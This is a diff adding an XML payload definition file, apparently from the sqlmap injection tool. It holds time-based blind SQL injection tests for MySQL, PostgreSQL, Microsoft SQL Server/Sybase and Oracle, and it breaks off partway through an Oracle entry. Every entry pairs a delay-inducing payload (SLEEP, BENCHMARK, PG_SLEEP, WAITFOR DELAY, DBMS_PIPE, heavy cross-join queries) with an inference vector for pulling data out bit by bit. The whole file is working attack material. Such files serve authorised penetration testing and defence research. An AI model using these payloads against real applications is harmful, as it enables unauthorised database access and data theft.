@@ -1,0 +1,2174 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <!-- Time-based boolean tests -->
+
+    <!-- Prefering "query SLEEP" over "SLEEP" because of JOIN-alike cases where SLEEPs get called multiple times (e.g. http://testphp.vulnweb.com/listproducts.php?cat=1) -->
+    <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>AND SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>OR SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>AND SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>OR SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
+        <request>
+            <payload>AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.12 AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 OR time-based blind (BENCHMARK)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
+        <request>
+            <payload>OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.12 OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
+        <request>
+            <payload>AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.12 AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0.12 OR time-based blind (BENCHMARK - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
+        <request>
+            <payload>OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.12 OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))</vector>
+        <request>
+            <payload>RLIKE SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))</vector>
+        <request>
+            <payload>RLIKE SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+     <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+             <dbms_version>&gt;= 5.0.12</dbms_version>
+       </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP - comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND time-based blind (ELT)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR time-based blind (ELT)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND time-based blind (ELT - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR time-based blind (ELT - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 AND time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 OR time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 AND time-based blind (comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL &gt; 8.1 OR time-based blind (comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+            <dbms_version>&gt; 8.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase time-based blind (IF)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
+        <request>
+            <payload>WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase time-based blind (IF - comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
+        <request>
+            <payload>WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR time-based blind</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND time-based blind (comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)</vector>
+        <request>
+            <payload>AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR time-based blind (comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
